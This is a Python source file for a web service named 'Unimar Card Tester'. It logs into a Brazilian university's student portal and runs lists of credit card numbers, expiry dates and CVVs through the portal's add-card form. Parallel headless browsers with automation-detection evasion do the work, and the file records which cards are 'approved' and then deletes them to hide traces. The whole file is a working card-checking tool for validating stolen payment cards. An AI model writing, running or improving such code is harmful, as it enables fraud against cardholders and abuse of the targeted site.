import os
import time
import asyncio
import subprocess
import random
import logging
from pathlib import Path
from typing import Set, Optional
from contextlib import asynccontextmanager

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, field_validator
from playwright.async_api import async_playwright
import uvicorn

# ================= CONFIG =================
PORT = int(os.getenv("PORT", "8000"))

URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login")
URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
EMAIL = os.getenv("UNIMAR_EMAIL", "")
SENHA = os.getenv("UNIMAR_SENHA", "")
NOME_FIXO = os.getenv("UNIMAR_NOME", "")
MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))

VIEWPORT = {"width": 1280, "height": 720}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
BROWSER_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-web-security",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-blink-features=AutomationControlled",
    "--disable-setuid-sandbox",
]

SESSAO_PATH = Path("sessao_unimar.json")
SESSAO_MAX_AGE = 86400

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("unimar")

# ================= PLAYWRIGHT =================
def garantir_playwright() -> bool:
    ms_playwright = Path("/root/.cache/ms-playwright")
    if ms_playwright.exists():
        for pasta in ms_playwright.iterdir():
            if pasta.is_dir() and pasta.name.startswith("chromium-"):
                chrome = pasta / "chrome-linux" / "chrome"
                if chrome.exists():
                    logger.info("Chromium encontrado: %s", chrome)
                    return True
    logger.warning("Chromium não encontrado. Instalando...")
    try:
        subprocess.run(["playwright", "install", "chromium"], check=True, timeout=120)
        return True
    except Exception:
        logger.exception("Erro ao instalar Chromium")
        return False

# ================= ESTADO =================
class Estado:
    def __init__(self):
        self.lock = asyncio.Lock()
        self.rodando = False
        self.cancelado = False
        self.clients: Set[WebSocket] = set()
        self.total_cartoes = 0
        self.tarefas_concluidas = 0
        self.aprovados = 0
        self.inicio_timestamp = 0.0
        self.canais_ativos = 0
        self.task: Optional[asyncio.Task] = None

estado = Estado()

# ================= HELPERS =================
async def estado_snapshot() -> dict:
    async with estado.lock:
        return {
            "rodando": estado.rodando,
            "total": estado.total_cartoes,
            "processados": estado.tarefas_concluidas,
            "aprovados": estado.aprovados,
            "canais_ativos": estado.canais_ativos,
        }

async def set_estado(**kwargs) -> None:
    async with estado.lock:
        for k, v in kwargs.items():
            setattr(estado, k, v)

async def inc_estado(campo: str, valor: int = 1) -> int:
    async with estado.lock:
        atual = getattr(estado, campo)
        novo = atual + valor
        setattr(estado, campo, novo)
        return novo

async def calc_velocidade() -> tuple[float, int]:
    async with estado.lock:
        inicio = estado.inicio_timestamp
        concluidas = estado.tarefas_concluidas
    elapsed = time.time() - inicio if inicio else 0
    velocidade = concluidas / (elapsed / 60) if elapsed > 0 else 0
    return round(velocidade, 1), round(elapsed)

async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
    if data is None:
        data = {}
    mensagem = {"type": tipo, **data}
    async with estado.lock:
        clients = list(estado.clients)

    tarefas = [client.send_json(mensagem) for client in clients]
    resultados = await asyncio.gather(*tarefas, return_exceptions=True)

    mortos = [c for c, r in zip(clients, resultados) if isinstance(r, Exception)]
    if mortos:
        async with estado.lock:
            for c in mortos:
                estado.clients.discard(c)

    logger.info("Broadcast %s enviado para %d cliente(s)", tipo, len(clients) - len(mortos))

def _log_task_exception(task: asyncio.Task) -> None:
    if task.cancelled():
        return
    exc = task.exception()
    if exc:
        logger.error("Erro no broadcast de log: %s", exc)

def log(app: FastAPI, msg: str) -> None:
    timestamp = time.strftime("%H:%M:%S")
    full = f"[{timestamp}] {msg}"
    logger.info(msg)
    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(broadcast(app, "log", {"mensagem": full}))
        task.add_done_callback(_log_task_exception)
    except RuntimeError:
        pass

# ================= SCHEMAS =================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

    @field_validator("canais")
    @classmethod
    def validar_canais(cls, v):
        if v < 1 or v > MAX_CANAIS:
            raise ValueError(f"Canais deve ser entre 1 e {MAX_CANAIS}")
        return v

# ================= FASTAPI =================
@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.playwright_ok = await asyncio.to_thread(garantir_playwright)
    app.state.job_task = None
    app.state.browser = None
    yield
    if estado.task and not estado.task.done():
        estado.cancelado = True
        estado.rodando = False
        estado.task.cancel()
        try:
            await estado.task
        except Exception:
            pass

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ================= PLAYWRIGHT FLOWS =================
async def sessao_valida(playwright) -> bool:
    if not SESSAO_PATH.exists():
        return False
    if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    try:
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(0.8)
        ok = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        await context.close()
        await browser.close()
        return ok
    except Exception:
        logger.exception("Erro ao validar sessão")
        return False

async def limpar_cartoes(page, app: FastAPI) -> None:
    try:
        log(app, "[Faxina] Iniciando limpeza...")
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(1.2)
        removidos = 0

        for _ in range(50):
            if estado.cancelado:
                break

            botoes = page.get_by_role("button", name="Remover")
            if await botoes.count() == 0:
                break

            try:
                await botoes.first.click(force=True, timeout=5000)
                await asyncio.sleep(0.5)
                removidos += 1
            except Exception:
                break

        log(app, f"[Faxina] {removidos} removidos")
    except Exception:
        logger.exception("[Faxina] Erro")

async def login_mestre(playwright, app: FastAPI) -> bool:
    try:
        if await sessao_valida(playwright):
            log(app, "[Auth] Sessão reutilizada (Modo Fast)")
            return True

        if not EMAIL or not SENHA:
            log(app, "[ERRO] Email/senha não configurados!")
            return False

        log(app, "[Auth] Login completo (Modo Full)...")
        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        page.on("dialog", lambda d: asyncio.create_task(d.accept()))

        await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()
        await page.wait_for_selector("text=Meus Cartões", timeout=30000)

        await limpar_cartoes(page, app)
        await context.storage_state(path=str(SESSAO_PATH))
        await context.close()
        await browser.close()

        log(app, "[Auth] Login concluído!")
        return True
    except Exception:
        logger.exception("[ERRO] Login falhou")
        return False

async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
    try:
        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(random.uniform(0.4, 1.0))

        await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
        await asyncio.sleep(0.5)

        await page.get_by_role("textbox", name="Número do cartão").fill(numero)
        await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
        await page.get_by_label("Mês").select_option(mes)
        await page.get_by_label("Ano").select_option(ano)
        await page.get_by_role("textbox", name="CVV").fill(cvv)

        botoes_antes = await page.get_by_role("button", name="Remover").count()
        await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)

        for _ in range(40):
            if estado.cancelado:
                return "cancelado"

            botoes_atual = await page.get_by_role("button", name="Remover").count()
            if botoes_atual > botoes_antes:
                return "aprovado"

            try:
                body = (await page.locator("body").inner_text()).lower()
                if any(x in body for x in ["inválida", "recusado", "erro", "não foi possível", "inválido"]):
                    return "reprovado"
            except Exception:
                pass

            await asyncio.sleep(0.5)

        return "timeout"
    except Exception:
        logger.exception("Erro em processar_cartao")
        return "erro"

async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
    await inc_estado("canais_ativos", 1)
    await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})

    context = None
    try:
        await asyncio.sleep(id_worker * 1.2)
        log(app, f"[Canal {id_worker}] Iniciando")

        context = await browser.new_context(
            storage_state=str(SESSAO_PATH),
            viewport=VIEWPORT,
            user_agent=USER_AGENT,
        )
        page = await context.new_page()
        page.on("dialog", lambda d: asyncio.create_task(d.accept()))

        while estado.rodando and not estado.cancelado:
            try:
                indice, linha, tentativa = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if fila.empty():
                    break
                continue

            try:
                partes = [x.strip() for x in linha.split("|")]
                if len(partes) != 4:
                    log(app, f"[Canal {id_worker}][{indice}] ❌ Formato inválido")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)
                    continue

                numero, mes, ano, cvv = partes
                log(app, f"[Canal {id_worker}][{indice}] ****{numero[-4:]}")

                resultado = await processar_cartao(page, numero, mes, ano, cvv)

                if resultado == "aprovado":
                    log(app, f"[Canal {id_worker}][{indice}] ✅ APROVADO")
                    await broadcast(app, "aprovado", {"cartao": linha})
                    await inc_estado("aprovados", 1)
                    await asyncio.to_thread(_escrever_aprovado, linha)
                    await inc_estado("tarefas_concluidas", 1)

                elif resultado == "reprovado":
                    log(app, f"[Canal {id_worker}][{indice}] ❌ Reprovado")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)

                elif resultado == "timeout" and tentativa < MAX_TENTATIVAS:
                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
                    await fila.put((indice, linha, tentativa + 1))
                    continue

                else:
                    if resultado == "timeout":
                        log(app, f"[Canal {id_worker}][{indice}] ❌ Timeout máximo")
                    elif resultado == "cancelado":
                        log(app, f"[Canal {id_worker}][{indice}] ⏹️ Cancelado")
                    else:
                        log(app, f"[Canal {id_worker}][{indice}] ❌ Erro")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)

                velocidade, elapsed = await calc_velocidade()
                await broadcast(app, "progresso", {
                    "processados": estado.tarefas_concluidas,
                    "total": estado.total_cartoes,
                    "aprovados": estado.aprovados,
                    "velocidade": velocidade,
                    "tempo": elapsed,
                })

            finally:
                fila.task_done()

    except Exception:
        logger.exception("[Canal %s] ERRO", id_worker)
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass
        await inc_estado("canais_ativos", -1)
        await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})
        log(app, f"[Canal {id_worker}] Finalizado")

def _escrever_aprovado(linha: str) -> None:
    with open("aprovados.txt", "a", encoding="utf-8") as f:
        f.write(f"{linha}\n")

async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: FastAPI) -> None:
    try:
        if not NOME_FIXO:
            log(app, "[ERRO] UNIMAR_NOME não configurado!")
            return

        linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
        if not linhas:
            log(app, "[ERRO] Nenhum cartão fornecido")
            return

        await set_estado(
            total_cartoes=len(linhas),
            tarefas_concluidas=0,
            aprovados=0,
            cancelado=False,
            inicio_timestamp=time.time(),
        )

        num_canais = min(max(num_canais, 1), MAX_CANAIS, len(linhas))
        log(app, f"[Sistema] {num_canais} canais | {len(linhas)} cartões")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await login_mestre(pw, app):
                log(app, "[ERRO] Falha na autenticação")
                return

            browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
            app.state.browser = browser
            try:
                tasks = [asyncio.create_task(worker(i, browser, fila, app)) for i in range(1, num_canais + 1)]
                await asyncio.gather(*tasks, return_exceptions=True)

                if estado.aprovados > 0 and not estado.cancelado:
                    log(app, "[Sistema] Faxina final...")
                    try:
                        ctx = await browser.new_context(
                            storage_state=str(SESSAO_PATH),
                            viewport=VIEWPORT,
                            user_agent=USER_AGENT,
                        )
                        pg = await ctx.new_page()
                        pg.on("dialog", lambda d: asyncio.create_task(d.accept()))
                        await limpar_cartoes(pg, app)
                        await ctx.close()
                    except Exception:
                        logger.exception("[Faxina] Erro")
            finally:
                app.state.browser = None
                await browser.close()

    except Exception:
        logger.exception("[ERRO CRÍTICO]")
    finally:
        await set_estado(rodando=False, cancelado=False, canais_ativos=0)
        log(app, "[Sistema] Processamento concluído!")
        await broadcast(app, "status", {"rodando": False, "canais_ativos": 0})

# ================= ROTAS =================
@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado.rodando:
        return {"status": "já_em_execucao"}

    await set_estado(rodando=True, cancelado=False)
    await broadcast(app, "status", {"rodando": True})
    estado.task = asyncio.create_task(processar_todos_cartoes(data.lista, data.canais, app))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    await set_estado(rodando=False, cancelado=True)
    log(app, "⛔ Interrupção solicitada")
    await broadcast(app, "status", {"rodando": False})
    return {"status": "parando"}

@app.get("/api/status")
async def status():
    velocidade, elapsed = await calc_velocidade()
    return {
        "rodando": estado.rodando,
        "total": estado.total_cartoes,
        "processados": estado.tarefas_concluidas,
        "aprovados": estado.aprovados,
        "canais_ativos": estado.canais_ativos,
        "velocidade": velocidade,
        "tempo": elapsed,
    }

@app.get("/api/health")
async def health():
    return {"status": "ok"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    async with estado.lock:
        estado.clients.add(websocket)
    logger.info("WebSocket conectado: %s", websocket.client)
    try:
        while True:
            data = await websocket.receive_text()
            # Cliente pode enviar pong ou outros comandos
    except WebSocketDisconnect:
        logger.info("WebSocket desconectado: %s", websocket.client)
    except Exception:
        logger.exception("Erro no WebSocket")
    finally:
        async with estado.lock:
            estado.clients.discard(websocket)

@app.get("/", response_class=HTMLResponse)
async def index():
    template_path = Path("templates/index.html")
    if template_path.is_file():
        return template_path.read_text(encoding="utf-8")
    return JSONResponse(
        status_code=404,
        content={"detail": "Template não encontrado. Verifique se o arquivo templates/index.html existe."}
    )

# ================= MAIN =================
if __name__ == "__main__":
    print("=" * 50)
    print(f"🚀 Unimar Card Tester iniciando em 0.0.0.0:{PORT}")
    print("🎭 Playwright será verificado no startup")
    print("=" * 50)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
